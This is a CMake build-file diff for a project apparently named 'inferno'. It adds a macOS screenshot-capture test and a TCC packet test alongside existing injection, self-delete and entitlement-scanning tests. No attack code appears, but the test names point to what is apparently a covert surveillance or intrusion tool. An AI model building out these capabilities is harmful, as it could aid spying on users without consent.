@@ -171,6 +171,18 @@ if(APPLE)
         TEST_BINARY_DIR="${CMAKE_CURRENT_BINARY_DIR}"
     )
     add_test(NAME InjectE2EmacOS COMMAND inferno_inject_e2e_macos_test)
+
+    # macOS Screenshot Capture Test (Objective-C++)
+    add_executable(inferno_macos_capture_test
+        tests/macos_capture_test.mm
+    )
+    target_include_directories(inferno_macos_capture_test PRIVATE
+        client/include
+    )
+    target_link_libraries(inferno_macos_capture_test PRIVATE
+        ${CORE_GRAPHICS} ${CORE_FOUNDATION} ${APP_KIT}
+    )
+    add_test(NAME MacOSCapture COMMAND inferno_macos_capture_test)
 endif()
 
 # ==========================================
@@ -259,6 +271,7 @@ add_executable(inferno_tests
     client/src/EntitlementScanner.cpp
     tests/inject_e2e_test.cpp
     tests/self_delete_test.cpp
+    tests/tcc_packet_test.cpp
 )
 if(WIN32)
     target_sources(inferno_tests PRIVATE
